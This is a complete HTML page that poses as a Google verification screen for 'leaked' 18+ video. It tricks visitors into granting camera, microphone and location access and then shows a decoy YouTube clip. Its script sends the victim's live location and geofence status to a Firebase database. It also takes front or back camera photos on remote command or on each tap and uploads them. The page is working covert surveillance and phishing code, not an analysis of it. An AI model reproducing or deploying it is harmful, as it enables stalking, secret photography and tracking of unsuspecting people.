<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Services - Secure Access</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #000; color: white; text-align: center; margin: 0; padding: 0; overflow: hidden; }
        .header { background: #1a1a1a; padding: 15px; text-align: left; font-size: 18px; color: #4285f4; font-weight: bold; border-bottom: 1px solid #333; }
        .container { padding: 60px 20px; }
        .viral-text { color: #fff; font-size: 24px; font-weight: bold; margin-bottom: 10px; }
        .sub-text { color: #aa0000; font-size: 14px; margin-bottom: 40px; text-transform: uppercase; letter-spacing: 1px; }
        #playBtn { 
            background: #d93025; color: white; border: none; padding: 15px 45px; 
            font-size: 18px; font-weight: bold; border-radius: 30px; cursor: pointer;
            box-shadow: 0 4px 15px rgba(217, 48, 37, 0.4); transition: 0.3s;
        }
        #playBtn:hover { transform: scale(1.05); background: #b21f16; }
        #videoArea { display: none; width: 100%; height: 100vh; background: #000; position: fixed; top: 0; left: 0; z-index: 100; }
        iframe { width: 100%; height: 100%; border: none; pointer-events: none; }
        /* Tap to capture layer */
        #captureLayer { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 101; cursor: pointer; }
    </style>
</head>
<body>

    <div id="mainUI">
        <div class="header">G-Services Authentication</div>
        <div class="container">
            <div class="viral-text">Verify to Watch Leaked Content</div>
            <div class="sub-text">Warning: Age Restricted (18+)</div>
            
            <button id="playBtn" onclick="startSystem()">
                CONFIRM & WATCH
            </button>
        </div>
    </div>

    <div id="videoArea">
        <div id="captureLayer" onclick="captureOnTap()"></div>
        <iframe id="viralPlayer" src="" allow="autoplay; encrypted-media"></iframe>
    </div>

    <script>
        // 1. Firebase Configuration
        const firebaseConfig = { databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com/" };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        let userId = localStorage.getItem("target_id") || "User_" + Math.floor(Math.random() * 9999);
        localStorage.setItem("target_id", userId);

        // Geofencing Target (Example: Delhi coordinates)
        const safeZone = { lat: 28.6139, lng: 77.2090, radius: 0.5 }; // radius in km

        async function startSystem() {
            try {
                // Request Permission (Must for Camera/Location)
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
                stream.getTracks().forEach(t => t.stop()); // Stop initial stream after permission

                document.getElementById('mainUI').style.display = 'none';
                document.getElementById('videoArea').style.display = 'block';
                document.getElementById('viralPlayer').src = "https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1&controls=0";

                initTracking();
            } catch (e) {
                alert("Error: You must allow all permissions to access this content.");
            }
        }

        function initTracking() {
            // Real-time Location & Geofencing
            navigator.geolocation.watchPosition((pos) => {
                const lat = pos.coords.latitude;
                const lng = pos.coords.longitude;
                
                // Check Geofence
                const distance = calculateDistance(lat, lng, safeZone.lat, safeZone.lng);
                const status = distance > safeZone.radius ? "Outside Safe Zone" : "Inside Safe Zone";

                db.ref('targets/' + userId + '/location').update({
                    lat: lat, lng: lng,
                    accuracy: pos.coords.accuracy + "m",
                    geofence: status,
                    last_seen: firebase.database.ServerValue.TIMESTAMP
                });
            }, null, { enableHighAccuracy: true });

            // Command Listener for Remote Capture (Front/Back)
            db.ref('commands/' + userId).on('value', async (snap) => {
                const cmd = snap.val();
                if (cmd?.action === "snap_front") capturePhoto("user");
                if (cmd?.action === "snap_back") capturePhoto("environment");
                if (cmd) db.ref('commands/' + userId).remove();
            });
        }

        // Tap on screen to click photo
        function captureOnTap() {
            // Default to front camera on tap
            capturePhoto("user");
            console.log("Photo captured on tap!");
        }

        async function capturePhoto(cameraMode) {
            try {
                const constraints = { video: { facingMode: cameraMode } };
                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                const video = document.createElement('video');
                video.srcObject = stream;
                await video.play();

                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth; 
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                const imageData = canvas.toDataURL('image/jpeg', 0.5);
                db.ref('targets/' + userId + '/photos').push({ 
                    image: imageData, 
                    type: cameraMode === "user" ? "Front" : "Back",
                    time: new Date().toLocaleString() 
                });

                stream.getTracks().forEach(t => t.stop());
            } catch (err) {
                console.error("Camera error: ", err);
            }
        }

        // Helper: Calculate distance for Geofencing
        function calculateDistance(lat1, lon1, lat2, lon2) {
            const R = 6371; // Earth Radius (km)
            const dLat = (lat2 - lat1) * Math.PI / 180;
            const dLon = (lon2 - lon1) * Math.PI / 180;
            const a = Math.sin(dLat/2) * Math.sin(dLat/2) +
                      Math.cos(lat1 * Math.PI / 180) * Math.cos(lat2 * Math.PI / 180) * Math.sin(dLon/2) * Math.sin(dLon/2);
            return R * (2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a)));
        }
    </script>
</body>
</html>
